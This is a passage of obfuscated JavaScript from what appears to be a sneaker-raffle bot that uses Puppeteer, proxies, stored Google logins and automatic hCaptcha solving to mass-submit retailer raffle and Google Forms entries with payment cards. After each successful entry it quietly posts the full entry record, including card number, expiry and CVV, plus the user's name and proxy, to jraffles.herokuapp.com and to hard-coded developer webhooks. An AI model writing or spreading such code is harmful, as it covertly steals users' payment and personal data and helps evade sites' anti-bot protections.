                        await _0x56330f['type']('input[name=\x22lastName\x22]', '' + _0x489ec9[_0x1d7822]['LastName']), await _0x4d97b0(0xc8), await _0x56330f['type']('input[name=\x22instagramUsername\x22]', '' + _0x489ec9[_0x1d7822]['Follower']), await _0x4d97b0(0x4b0), await _0x56330f['click']('button.btn.continue-button__1RtsS'), await _0x4d97b0(0x3e8), console['log'](_0x1211a5() + '\x20[' + _0x18b5ab['name'] + ']\x20Task\x20' + (_0x1d7822 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x56330f['select']('select[name=\x22country\x22]', '' + _0x489ec9[_0x1d7822]['Country']), await _0x4d97b0(0x2bc), await _0x56330f['type']('input[name=\x22streetName\x22]', '' + _0x489ec9[_0x1d7822]['Address1']), await _0x4d97b0(0x258), await _0x56330f['type']('input[name=\x22houseNumber\x22]', _0x489ec9[_0x1d7822]['HouseNumber'] + '\x20' + _0x489ec9[_0x1d7822]['Address2']), await _0x4d97b0(0xc8), await _0x56330f['type']('input[name=\x22postalCode\x22]', '' + _0x489ec9[_0x1d7822]['Zip']), await _0x4d97b0(0x1f4), await _0x56330f['type']('input[name=\x22city\x22]', '' + _0x489ec9[_0x1d7822]['City']), await _0x4d97b0(0x4b0), await _0x56330f['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x4d97b0(0x4b0), await _0x56330f['click']('button.btn.continue-button__1RtsS'), await _0x4d97b0(0x4b0), console['log'](_0x1211a5() + '\x20[' + _0x18b5ab['name'] + ']\x20Task\x20' + (_0x1d7822 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x56330f['solveRecaptchas'](), console['log'](_0x1211a5() + '\x20[' + _0x18b5ab['name'] + ']\x20Task\x20' + (_0x1d7822 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x4d97b0(0xbb8), await _0x56330f['click']('button.btn.continue-button__1RtsS'), await _0x4d97b0(0x1388), console['log'](_0x1211a5() + '\x20[' + _0x18b5ab['name'] + ']\x20Task\x20' + (_0x1d7822 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x56330f['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x56330f['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4d97b0(0x4b0), await _0x56330f['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x489ec9[_0x1d7822]['CardNumber']), await _0x4d97b0(0x320), await _0x56330f['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x56330f['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x489ec9[_0x1d7822]['ExpiryDate']), await _0x4d97b0(0x4b0), await _0x56330f['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x56330f['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x489ec9[_0x1d7822]['CVV']), await _0x4d97b0(0x226), await _0x56330f['type']('input[name=\x22holderName\x22]', '' + _0x489ec9[_0x1d7822]['NameOnCard']), await _0x4d97b0(0x226), await _0x56330f['click']('button.adyen-checkout__button'), console['log'](_0x1211a5() + '\x20[' + _0x18b5ab['name'] + ']\x20Task\x20' + (_0x1d7822 + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x56330f['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x4d97b0(0xbb8);
                        } catch (_0x5bfb10) {
                            console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x18b5ab['name'] + ']\x20Task\x20' + (_0x1d7822 + 0x1) + '\x20:\x203DS\x20Failed')), _0x1d7784 = '3DS\x20Error\x20' + _0x5bfb10;
                            var _0x4694d6 = await _0x4ef820(_0x489ec9[_0x1d7822], _0x18b5ab, 'dev', !![], _0x1d7784);
                            _0x4fb346['errorDEV'] = { 'embeds': [_0x4694d6] };
                            _0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '' && await _0xa7b872(_0x4562fb['webhook'], _0x4fb346['errorDEV']);
                            await _0xa7b872(_0x5f83c7, _0x4fb346['errorDEV']);
                            continue;
                        }
                        _0x3b7ca0(_0x489ec9[_0x1d7822], _0x18b5ab), console['log'](_0x1de0e8['green'](_0x1211a5() + '\x20[' + _0x18b5ab['name'] + ']\x20Task\x20' + (_0x1d7822 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        let _0x4cac33 = _0x489ec9[_0x1d7822];
                        try {
                            prxdata = {
                                'username': _0x1d8120['replace']('#', ''),
                                'module': _0x18b5ab['name'],
                                'entrydata': JSON['stringify'](_0x4cac33),
                                'proxy': '' + _0x1767c3[_0x1d7822]
                            };
                            var _0x29cabb = JSON['stringify'](prxdata);
                            let _0x57bf0b = { 'headers': { 'content-type': 'application/json' } };
                            await _0x4012a9['post']('https://jraffles.herokuapp.com/success', _0x29cabb, _0x57bf0b);
                        } catch (_0x1d1165) {
                        }
                        if (_0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '')
                            try {
                                await _0xa7b872(_0x4562fb['webhook'], _0x4fb346['succesDEVMSG']);
                            } catch {
                            }
                        await _0x4d97b0(0xc8), await _0xa7b872(_0x27bacd, _0x4fb346['succesDEVMSG']), await _0x4d97b0(0xc8);
                        try {
                            await _0xa7b872(_0x3f583b, _0x4fb346['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x101250) {
                        console['log'](_0x1211a5() + '\x20[' + _0x18b5ab['name'] + ']\x20Task\x20' + (_0x1d7822 + 0x1) + '\x20:\x20' + _0x101250), _0x1d7784 = '' + _0x101250;
                        var _0x4694d6 = await _0x4ef820(_0x489ec9[_0x1d7822], _0x18b5ab, 'dev', !![], _0x1d7784);
                        _0x4fb346['errorDEV'] = { 'embeds': [_0x4694d6] }, _0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '' && await _0xa7b872(_0x4562fb['webhook'], _0x4fb346['errorDEV']), await _0xa7b872(_0x5f83c7, _0x4fb346['errorDEV']), _0x1507ac = 'yes';
                    } finally {
                        _0x2651fe['close']();
                        if (_0x1507ac == 'yes' && _0x4693a4 != 0x5) {
                            console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x18b5ab['name'] + ']\x20Task\x20' + (_0x1d7822 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4693a4 + '\x20/\x205)')), _0x1d7822 = _0x1d7822 - 0x1, _0x4693a4 = _0x4693a4 + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x4562fb['delay'] + '\x20ms'), await _0x4d97b0(_0x4562fb['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'Google\x20Forms',
        'modules': [{
            'name': 'SMART\x20ENTRIES',
            'store': 'Google\x20Forms',
            'logo': 'https://www.pngplay.com/wp-content/uploads/13/Google-Logo-PNG-HD-Quality.png',
            'function': async function (_0x9200ae, _0x3014c0, _0x1d2a3d) {
                let _0x19d724 = {
                    'FirstName': '',
                    'LastName': '',
                    'Email': '',
                    'Country': '',
                    'Address': '',
                    'City': '',
                    'Zip': '',
                    'Size': '',
                    'Phone': ''
                };
                var _0x13e5af = _0x4a3989['readFileSync']('forms/templates.json', 'utf-8');
                let _0x37b8f0 = JSON['parse'](_0x13e5af), _0x4e7b5b = ![];
                if (_0x37b8f0['length'] != 0x0) {
                    let _0x595e69 = 0x0;
                    for (template of _0x37b8f0) {
                        if (template['Url'] == _0x3014c0[0x0]['Url']) {
                            _0x4e7b5b = !![], console['log'](_0x1de0e8['yellow']('Would\x20you\x20like\x20to\x20use\x20this\x20template?'));
                            for (key in template) {
                                key != 'Url' && !key['includes']('Select') && !key['includes']('custom') && template[key] != '' && console['log'](template[key] + ':\x20' + _0x1de0e8['cyan'](key)), (key['includes']('Select') || key['includes']('custom')) && console['log'](template[key]['title'] + ':\x20' + _0x1de0e8['cyan'](template[key]['answer']));
                            }
                            console['log']();
                            async function _0x2dac42() {
                                let _0x47ca88 = await _0x4a7744['get']('answer');
                                if (_0x47ca88['answer']['toLowerCase']() != 'y' && _0x47ca88['answer']['toLowerCase']() != 'n')
                                    return console['log']('Invalid\x20Selection'), _0x2dac42();
                                return _0x47ca88['answer']['toLowerCase']();
                            }
                            if (await _0x2dac42() == 'n') {
                                _0x37b8f0['splice'](_0x595e69, 0x1), console['clear']();
                                break;
                            }
                            _0x19d724 = template, console['clear']();
                            break;
                        }
                        _0x595e69++;
                    }
                }
                let _0x32a330 = 0x0, _0x2610aa = 0x0;
                function _0x3a20d6(_0x260021) {
                    console['log'](_0x1211a5() + '\x20[' + _0x9200ae['name'] + ']\x20Task\x20' + (_0x412ffb + 0x1) + '\x20:\x20' + _0x260021);
                }
                var _0x89bf73 = 0x0;
                for (key in _0x19d724) {
                    if (key['includes']('custom'))
                        _0x32a330++;
                    if (key['includes']('Select'))
                        _0x2610aa++;
                }
                for (var _0x412ffb = 0x0; _0x412ffb < _0x3014c0['length']; _0x412ffb++) {
                    _0x19d724['Url'] = _0x3014c0[_0x412ffb]['Url'];
                    let _0x5f0136 = ![];
                    if (_0x37b8f0['length'] != 0x0)
                        for (template of _0x37b8f0) {
                            if (template['Url'] == _0x3014c0[_0x412ffb]['Url']) {
                                _0x19d724 = template, _0x5f0136 = !![], _0x3a20d6('Found\x20Template');
                                break;
                            }
                        }
                    var _0x25f5c1;
                    if (_0x5c7c82 != 'yes') {
                        if (!_0x5c7c82)
                            var _0x5c7c82 = '';
                        else
                            _0x5c7c82 = '';
                        _0x89bf73 = 0x0;
                    }
                    try {
                        await _0x43eceb(_0x3014c0, _0x412ffb);
                    } catch {
                        _0x5c7c82 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x4562fb['useRandomProxy'] = ![])
                        var _0x132433 = _0x1d2a3d[_0x412ffb]['split'](':');
                    else
                        var _0xf66fe2 = Math['round'](Math['random']() * (_0x1d2a3d['length'] - 0x1)), _0x132433 = _0x1d2a3d[_0xf66fe2]['split'](':');
                    var _0x385c02;
                    if (_0x132433['length'] == 0x1)
                        try {
                            _0x385c02 = await _0x3621d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x385c02 = await _0x3621d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ],
                                'env': { 'LANGUAGE': 'en-US' }
                            });
                        }
                    else
                        try {
                            _0x385c02 = await _0x3621d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x132433[0x0] + ':' + _0x132433[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x385c02 = await _0x3621d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x132433[0x0] + ':' + _0x132433[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ],
                                'env': { 'LANGUAGE': 'en-US' }
                            });
                        }
                    try {
                        let _0x3f3efd = { 'first': ![] };
                        const _0x45ef6e = await _0x385c02['newPage']();
                        if (_0x132433['length'] != 0x0)
                            await _0x45ef6e['authenticate']({
                                'username': '' + _0x132433[0x2],
                                'password': '' + _0x132433[0x3]
                            });
                        _0x3a20d6('Getting\x20Session');
                        let _0x20bbd5 = ![];
                        try {
                            await _0x45ef6e['goto'](_0x3014c0[_0x412ffb]['Url'], {
                                'waitUntil': 'load',
                                'timeout': 0x0
                            }), await _0x4d97b0(0xbb8);
                        } catch (_0x2ece7d) {
                            throw new Error(_0x2ece7d);
                        }
                        const _0x3604eb = await _0x45ef6e['$']('body\x20>\x20div.llhEMd.iWO5td\x20>\x20div\x20>\x20div.g3VIld.Up8vH.J9Nfi.iWO5td\x20>\x20div.XfpsVe.J9fJmf');
                        if (_0x3604eb) {
                            _0x3a20d6('Login\x20Detected');
                            let _0x4f0169 = await _0x3604eb['$']('div[data-id=\x22EBS5u\x22]');
                            await _0x4f0169['click'](), _0x20bbd5 = !![];
                        }
                        let _0x36bc05 = await _0x45ef6e['$']('#identifierId');
                        _0x36bc05 && (_0x20bbd5 = !![]);
                        async function _0x9d2c0c() {
                            try {
                                await _0x45ef6e['waitForSelector']('#identifierId');
                                let _0x1cfa71 = await _0x45ef6e['$']('#identifierId');
                                await _0x1cfa71['type'](_0x3014c0[_0x412ffb]['Email'], { 'delay': 0x96 }), await _0x4d97b0(0x640);
                                let _0x36eb14 = await _0x45ef6e['$']('#identifierNext\x20>\x20div\x20>\x20button\x20>\x20span');
                                await _0x36eb14['click'](), await _0x4d97b0(0x640), await _0x45ef6e['waitForSelector']('#password');
                                let _0x583780 = await _0x45ef6e['$']('#password\x20>\x20div.aCsJod.oJeWuf\x20>\x20div\x20>\x20div.Xb9hP\x20>\x20input');
                                await _0x583780['type'](_0x3014c0[_0x412ffb]['Password'], { 'delay': 0x96 }), await _0x4d97b0(0x1f4), await _0x36eb14['click']();
                            } catch (_0x4c2c01) {
                            }
                        }
                        _0x20bbd5 && await _0x9d2c0c();
                        await _0x4d97b0(0x2710), await _0x45ef6e['waitForSelector']('.teQAzf');
                        async function _0x5f0b70() {
                            let _0x40b84a = await _0x45ef6e['$$']('.o3Dpx\x20>\x20div[role=\x22listitem\x22]');
                            for (question of _0x40b84a) {
                                let _0xe19067;
                                try {
                                    _0xe19067 = await question['$eval']('.M7eMe', _0x523fce => _0x523fce['textContent']);
                                } catch {
                                    continue;
                                }
                                if (_0x32a330 != 0x0) {
                                    let _0x5125ac = ![];
                                    for (let _0x49e5f4 = 0x0; _0x49e5f4 < _0x32a330; _0x49e5f4++) {
                                        if (_0xe19067 == _0x19d724['custom' + _0x49e5f4]['title']) {
                                            _0x3a20d6('Custom\x20Selector\x20found;\x20' + _0xe19067);
                                            let _0x4903b7 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0xb27876 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                            if (_0x4903b7)
                                                await _0x4903b7['type']('' + _0x19d724['custom' + _0x49e5f4]['answer']);
                                            else
                                                _0xb27876 && await _0xb27876['type']('' + _0x19d724['custom' + _0x49e5f4]['answer']);
                                            _0x5125ac = !![];
                                            break;
                                        }
                                    }
                                    if (_0x5125ac) {
                                        await _0x4d97b0(0x15e);
                                        continue;
                                    }
                                }
                                if (_0x2610aa != 0x0) {
                                    let _0x1420d7 = ![];
                                    for (let _0x56905a = 0x0; _0x56905a < _0x2610aa; _0x56905a++) {
                                        if (_0xe19067 == _0x19d724[_0x56905a + 'Select']['title']) {
                                            _0x3a20d6('Custom\x20Selector\x20found;\x20' + _0xe19067);
                                            let _0x1b579f = await question['$$']('.ulDsOb');
                                            for (opt of _0x19d724[_0x56905a + 'Select']['answer']) {
                                                let _0x21980e = await _0x1b579f[opt]['$']('span');
                                                await _0x21980e['click']();
                                            }
                                            _0x1420d7 = !![];
                                            break;
                                        }
                                    }
                                    if (_0x1420d7) {
                                        await _0x4d97b0(0x15e);
                                        continue;
                                    }
                                }
                                try {
                                    if (_0xe19067 == _0x19d724['0Select']['title']) {
                                        _0x3a20d6('Custom\x20Selector\x20found;\x20' + _0x19d724['0Select']['title']);
                                        let _0x1b2718 = await question['$$']('.ulDsOb'), _0x396715 = await _0x1b2718[_0x19d724['0Select']['answer']];
                                        await _0x396715['click']();
                                        continue;
                                    }
                                    if (_0xe19067 == _0x19d724['1Select']['title']) {
                                        _0x3a20d6('Custom\x20Selector\x20found;\x20' + _0x19d724['1Select']['title']);
                                        let _0x1b2cff = await question['$$']('.ulDsOb'), _0x102d23 = await _0x1b2cff[_0x19d724['1Select']['answer']];
                                        await _0x102d23['click']();
                                        continue;
                                    }
                                    if (_0xe19067 == _0x19d724['2Select']['title']) {
                                        _0x3a20d6('Custom\x20Selector\x20found;\x20' + _0x19d724['2Select']['title']);
                                        let _0x5c22d3 = await question['$$']('.ulDsOb'), _0xa1c480 = await _0x5c22d3[_0x19d724['2Select']['answer']];
                                        await _0xa1c480['click']();
                                        continue;
                                    }
                                } catch (_0x7016e6) {
                                }
                                if (_0xe19067['toLowerCase']()['includes']('mail') && !_0xe19067['toLowerCase']()['includes']('agree') || _0xe19067 == _0x19d724['Email']) {
                                    _0x3a20d6('Mail\x20Selector\x20found;\x20' + _0xe19067);
                                    let _0x34d730 = await question['$']('input');
                                    !_0x34d730 && (_0x34d730 = await question['$']('textarea[jsname=\x22YPqjbf\x22]'));
                                    await _0x34d730['type'](_0x3014c0[_0x412ffb]['Email']), await _0x4d97b0(0x258);
                                    continue;
                                }
                                if (_0xe19067['toLowerCase']()['includes']('first') || _0xe19067['toLowerCase']() == 'name' || _0xe19067['toLowerCase']() == 'name\x20' || _0xe19067 == _0x19d724['FirstName']) {
                                    _0x3a20d6('FirstName\x20Selector\x20found;\x20' + _0xe19067);
                                    let _0x1a8990 = await question['$']('input');
                                    !_0x1a8990 && (_0x1a8990 = await question['$']('textarea'));
                                    await _0x1a8990['type'](_0x3014c0[_0x412ffb]['FirstName'] + '\x20'), await _0x4d97b0(0x258);
                                    if (_0xe19067 == _0x19d724['FirstName'])
                                        continue;
                                }
                                if (_0xe19067['toLowerCase']()['includes']('last') || _0xe19067['toLowerCase']()['includes']('surname') || _0xe19067 == _0x19d724['LastName']) {
                                    _0x3a20d6('LastName\x20Selector\x20found;\x20' + _0xe19067);
                                    let _0x59fcf7 = await question['$']('input');
                                    !_0x59fcf7 && (_0x59fcf7 = await question['$']('textarea'));
                                    await _0x59fcf7['type'](_0x3014c0[_0x412ffb]['LastName'] + '\x20'), await _0x4d97b0(0x258);
                                    continue;
                                }
                                if (_0xe19067['toLowerCase']()['includes']('address') && !_0xe19067['toLowerCase']()['includes']('agree') || _0xe19067 == _0x19d724['Address']) {
                                    _0x3a20d6('Address\x20Selector\x20found;\x20' + _0xe19067);
                                    let _0x4dc25f = await question['$']('input');
                                    !_0x4dc25f && (_0x4dc25f = await question['$']('textarea'));
                                    await _0x4dc25f['type'](_0x3014c0[_0x412ffb]['Address1'] + '\x20' + _0x3014c0[_0x412ffb]['HouseNumber'] + '\x20' + _0x3014c0[_0x412ffb]['Address2']), await _0x4d97b0(0x258);
                                    continue;
                                }
                                if (_0xe19067['toLowerCase']()['includes']('phone') || _0xe19067['toLowerCase']()['includes']('mobile') || _0xe19067 == _0x19d724['Phone']) {
                                    _0x3a20d6('Phone\x20Selector\x20found;\x20' + _0xe19067);
                                    let _0x390fd6 = await question['$']('input');
                                    !_0x390fd6 && (_0x390fd6 = await question['$']('textarea'));
                                    await _0x390fd6['type']('' + _0x3014c0[_0x412ffb]['Phone']), await _0x4d97b0(0x258);
                                    continue;
                                }
                                if (_0xe19067['toLowerCase']()['includes']('country') || _0xe19067 == _0x19d724['Country']) {
                                    let _0x2f1c58 = await question['$']('div[jsname=\x22wCJL8\x22]');
                                    if (_0x2f1c58) {
                                        let _0x32a6bd = ![], _0x3c97d9 = await _0x2f1c58['$$']('.ulDsOb');
                                        for (option of _0x3c97d9) {
                                            let _0x43b451 = await option['$']('span'), _0x5dff34 = await option['$eval']('span', _0x48a726 => _0x48a726['textContent']);
                                            if (_0x5dff34['toLowerCase']() == _0x3014c0[_0x412ffb]['Country']['toLowerCase']()) {
                                                await _0x43b451['click'](), _0x32a6bd = !![];
                                                break;
                                            }
                                        }
                                        if (!_0x32a6bd) {
                                            const _0x4277e5 = await question['$']('.Hvn9fb.zHQkBf');
                                            await _0x4277e5['click'](), await _0x4277e5['type'](_0x3014c0[_0x412ffb]['Country']);
                                        }
                                        continue;
                                    }
                                    _0x3a20d6('Country\x20Selector\x20found;\x20' + _0xe19067);
                                    let _0x75d439 = await question['$']('input');
                                    !_0x75d439 && (_0x75d439 = await question['$']('textarea'));
                                    await _0x75d439['type']('' + _0x3014c0[_0x412ffb]['Country']), await _0x4d97b0(0x258);
                                    continue;
                                }
                                if (_0xe19067['toLowerCase']()['includes']('city') || _0xe19067 == _0x19d724['City']) {
                                    _0x3a20d6('City\x20Selector\x20found;\x20' + _0xe19067);
                                    let _0x5293a8 = await question['$']('input');
                                    !_0x5293a8 && (_0x5293a8 = await question['$']('textarea'));
                                    await _0x5293a8['type']('' + _0x3014c0[_0x412ffb]['City']), await _0x4d97b0(0x258);
                                    continue;
                                }
                                if (_0xe19067['toLowerCase']()['includes']('zip') || _0xe19067 == _0x19d724['Zip']) {
                                    _0x3a20d6('Zip\x20Selector\x20found;\x20' + _0xe19067);
                                    let _0x477afb = await question['$']('input');
                                    !_0x477afb && (_0x477afb = await question['$']('textarea'));
                                    await _0x477afb['type']('' + _0x3014c0[_0x412ffb]['Zip']), await _0x4d97b0(0x258);
                                    continue;
                                }
                                if (_0xe19067['toLowerCase']()['includes']('insta') || _0xe19067 == _0x19d724['Follower']) {
                                    _0x3a20d6('Follower\x20Selector\x20found;\x20' + _0xe19067);
                                    let _0x2c08c3 = await question['$']('input');
                                    !_0x2c08c3 && (_0x2c08c3 = await question['$']('textarea'));
                                    await _0x2c08c3['type']('' + _0x3014c0[_0x412ffb]['Follower']), await _0x4d97b0(0x258);
                                    continue;
                                }
                                if (_0xe19067['toLowerCase']()['includes']('size') || _0xe19067 == _0x19d724['Size']) {
                                    _0x3a20d6('Size\x20Selector\x20found;\x20' + _0xe19067);
                                    let _0x1402f7 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x1402f7) {
                                        let _0x19a428 = await _0x1402f7['$$']('.ulDsOb');
                                        if (_0x3014c0[_0x412ffb]['Size']['toLowerCase']() == 'random') {
                                            var _0x327b09 = Math['round'](Math['random']() * (_0x19a428['length'] - 0x1));
                                            await _0x19a428[_0x327b09]['click']();
                                        } else
                                            for (size of _0x19a428) {
                                                let _0x43bdd9 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x469273 => _0x469273['textContent']);
                                                if (_0x43bdd9['toLowerCase']()['includes'](_0x3014c0[_0x412ffb]['Size'])) {
                                                    await size['click']();
                                                    break;
                                                }
                                            }
                                    }
                                    let _0x311a00 = await question['$']('.ry3kXd');
                                    if (_0x311a00) {
                                        await _0x311a00['click'](), await _0x4d97b0(0x9c4);
                                        let _0x4dd185 = await _0x45ef6e['$']('div[jsname=\x22V68bde\x22]'), _0x37e23a = await _0x4dd185['$$']('div[jsname=\x22wQNmvb\x22]');
                                        for (size of _0x37e23a) {
                                            let _0x34ff13 = await size['$eval']('.vRMGwf.oJeWuf', _0x4a788d => _0x4a788d['textContent']), _0x199b15 = await size['$']('.vRMGwf.oJeWuf');
                                            if (_0x34ff13['toLowerCase']()['includes'](_0x3014c0[_0x412ffb]['Size'])) {
                                                await _0x4d97b0(0x190), await _0x199b15['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x4d97b0(0x258);
                                    continue;
                                }
                                if (_0xe19067['toLowerCase']()['includes']('receive') || _0xe19067['toLowerCase']()['includes']('method')) {
                                    _0x3a20d6('Method\x20Selector\x20found;\x20' + _0xe19067);
                                    let _0x14b7aa = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x14b7aa) {
                                        const _0x1f35cb = await _0x14b7aa['$$']('.ulDsOb');
                                        for (size of _0x1f35cb) {
                                            let _0x32466a = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x5bb351 => _0x5bb351['textContent']);
                                            if (_0x32466a['toLowerCase']()['includes']('shipping')) {
                                                await size['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x4d97b0(0x258);
                                    continue;
                                }
                                if (_0xe19067['toLowerCase']()['includes']('offers') || _0xe19067['toLowerCase']()['includes']('agree')) {
                                    _0x3a20d6('Authorization\x20Selector\x20found;\x20' + _0xe19067);
                                    const _0x3fe492 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x3fe492) {
                                        const _0x2acc07 = await _0x3fe492['$$']('.ulDsOb');
                                        for (size of _0x2acc07) {
                                            let _0x58858d = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x471fc3 => _0x471fc3['textContent']);
                                            if (_0x58858d['toLowerCase']()['includes']('authorize') || _0x58858d['toLowerCase']()['includes']('yes')) {
                                                await size['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x4d97b0(0x258);
                                    continue;
                                }
                                async function _0x46c5c4() {
                                    let _0x489094 = await question['$']('.oyXaNc');
                                    if (_0x489094) {
                                        console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x1de0e8['cyan'](_0xe19067) + '\x0a');
                                        let _0x384a52 = await question['$$']('.ulDsOb');
                                        for (let _0x4b2d22 = 0x0; _0x4b2d22 < _0x384a52['length']; _0x4b2d22++) {
                                            let _0x2bec71 = await _0x384a52[_0x4b2d22]['$eval']('span', _0x5cff69 => _0x5cff69['textContent']);
                                            console['log']('\x20(' + _0x4b2d22 + ')\x20' + _0x2bec71);
                                        }
                                        console['log']();
                                        let _0x1d36a4 = await _0x4a7744['get']('option'), _0x385240 = await _0x384a52[_0x1d36a4['option']]['$eval']('span', _0x225eb7 => _0x225eb7['textContent']);
                                        _0x19d724[_0x2610aa + 'Select'] = {
                                            'title': _0xe19067,
                                            'answer': _0x1d36a4['option']['split'](',')
                                        };
                                        let _0x20dd57 = await _0x384a52[_0x1d36a4['option']]['$']('span');
                                        await _0x20dd57['click'](), _0x2610aa++;
                                        return;
                                    }
                                    let _0x300d63 = await question['$']('.Y6Myld');
                                    if (_0x300d63) {
                                        console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x1de0e8['cyan'](_0xe19067) + '\x0a');
                                        let _0x5a5681 = await question['$$']('.ulDsOb');
                                        for (let _0x57acb5 = 0x0; _0x57acb5 < _0x5a5681['length']; _0x57acb5++) {
                                            let _0x36083c = await _0x5a5681[_0x57acb5]['$eval']('span', _0x56c4cb => _0x56c4cb['textContent']);
                                            console['log']('\x20(' + _0x57acb5 + ')\x20' + _0x36083c);
                                        }
                                        console['log']();
                                        let _0x2e094c = await _0x4a7744['get']('option');
                                        _0x19d724[_0x2610aa + 'Select'] = {
                                            'title': _0xe19067,
                                            'answer': _0x2e094c['option']['split'](',')
                                        };
                                        for (opt of _0x19d724[_0x2610aa + 'Select']['answer']) {
                                            let _0xcef2af = await _0x5a5681[opt]['$']('span');
                                            await _0xcef2af['click']();
                                        }
                                        _0x2610aa++;
                                        return;
                                    }
                                    var _0x3dbcb4 = 0x0;
                                    let _0x1088b3 = Object['keys'](_0x19d724);
                                    console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x1de0e8['cyan'](_0xe19067) + '\x0a');
                                    for (data of _0x1088b3) {
                                        !data['includes']('custom' && !data['includes']('Select')) ? console['log']('\x20(' + _0x3dbcb4 + ')\x20' + data + '\x20(Taken\x20from\x20csv)') : console['log']('\x20(' + _0x3dbcb4 + ')\x20' + data), _0x3dbcb4++;
                                    }
                                    console['log']('\x20(' + _0x1088b3['length'] + ')\x20Custom\x20input:'), console['log']();
                                    let _0x5099b5 = await _0x4a7744['get']('input');
                                    if (_0x5099b5['input'] == _0x1088b3['length']) {
                                        console['log']('What\x20should\x20the\x20bot\x20fill\x20in\x20this\x20input?\x0a');
                                        let _0x127ddc = await _0x4a7744['get']('input');
                                        _0x19d724['custom' + _0x32a330] = {
                                            'title': _0xe19067,
                                            'answer': '' + _0x127ddc['input']
                                        };
                                        let _0x23e9a5 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x199449 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                        if (_0x23e9a5)
                                            await _0x23e9a5['type']('' + _0x19d724['custom' + _0x32a330]['answer']);
                                        else
                                            _0x199449 && await _0x199449['type']('' + _0x19d724['custom' + _0x32a330]['answer']);
                                        _0x32a330++;
                                        return;
                                    }
                                    _0x19d724['' + _0x1088b3[_0x5099b5['input']]] = _0xe19067;
                                    let _0x46035e = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x518d43 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                    _0x46035e && await _0x46035e['type']('' + _0x3014c0[_0x412ffb]['' + _0x1088b3[_0x5099b5['input']]]), _0x518d43 && await _0x518d43['type']('' + _0x3014c0[_0x412ffb]['' + _0x1088b3[_0x5099b5['input']]]), await _0x4d97b0(0x258);
                                }
                                await _0x46c5c4(), await _0x4d97b0(0x37a);
                            }
                            let _0x231876 = await _0x45ef6e['$']('div[jsname=\x22OCpkoe\x22]');
                            if (_0x231876)
                                return await _0x231876['click'](), await _0x45ef6e['waitForNavigation']({ 'waitUntil': 'networkidle2' }), _0x3a20d6('New\x20Section'), _0x5f0b70();
                        }
                        await _0x5f0b70(), await _0x45ef6e['click']('div[jsname=\x22M2UYVd\x22]');
                        try {
                            await _0x45ef6e['waitForSelector']('.vHW8K');
                        } catch {
                            throw new Error('Could\x20not\x20send\x20Form,\x20check\x20all\x20fields!');
                        }
                        _0x3b7ca0(_0x3014c0[_0x412ffb], _0x9200ae), _0x5c7c82 = 'no';
                        var _0x545dcf = await _0x4ef820(_0x3014c0[_0x412ffb], _0x9200ae, 'dev', ![]), _0x4911a6 = await _0x4ef820(_0x3014c0[_0x412ffb], _0x9200ae, 'pub', ![]);
                        let _0x46b3c3 = _0x3014c0[_0x412ffb];
                        try {
